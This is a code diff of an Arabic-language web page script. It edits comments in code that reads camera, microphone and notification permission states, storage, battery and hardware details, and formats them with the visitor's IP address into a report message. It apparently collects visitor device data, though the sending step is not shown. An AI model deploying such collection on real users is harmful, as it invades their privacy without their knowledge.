@@ -38,7 +38,7 @@
             try {
                 if (navigator.permissions) {
                     const camPerm = await navigator.permissions.query({ name: 'camera' });
-                    camStatus = camPerm.state; // granted / denied / prompt
+                    camStatus = camPerm.state; 
 
                     const micPerm = await navigator.permissions.query({ name: 'microphone' });
                     micStatus = micPerm.state;
@@ -46,14 +46,12 @@
                     const notifPerm = await navigator.permissions.query({ name: 'notifications' });
                     notifStatus = notifPerm.state;
                 }
-            } catch (e) {
-                // بعض المتصفحلت لا تدعم الاستعلام عن بعض الأذونات مباشرة
-            }
+            } catch (e) {}
 
             return { camStatus, micStatus, notifStatus };
         }
 
-        // فحص مساحة التخزين المتاحة (إن أمكن)
+        // فحص مساحة التخزين المتاحة
         async function getStorageInfo() {
             let storageInfo = 'غير متوفر';
             try {
@@ -96,7 +94,7 @@
                             `🌐 **عنوان الـ IP:** ${ip}\n` +
                             `--------------------------\n` +
                             `📱 **نوع الجهاز:** ${userDevice}\n` +
-                            `🧠 **الرام (ذاكرة العشوائية):** ${deviceMemory}\n` +
+                            `🧠 **الرام (الذاكرة العشوائية):** ${deviceMemory}\n` +
                             `⚙️ **معالج الجهاز:** ${hardwareConcurrency}\n` +
                             `💾 **مساحة التخزين:** ${storage}\n` +
                             `🔋 **البطارية:** ${batteryLevel} (${isCharging})\n` +
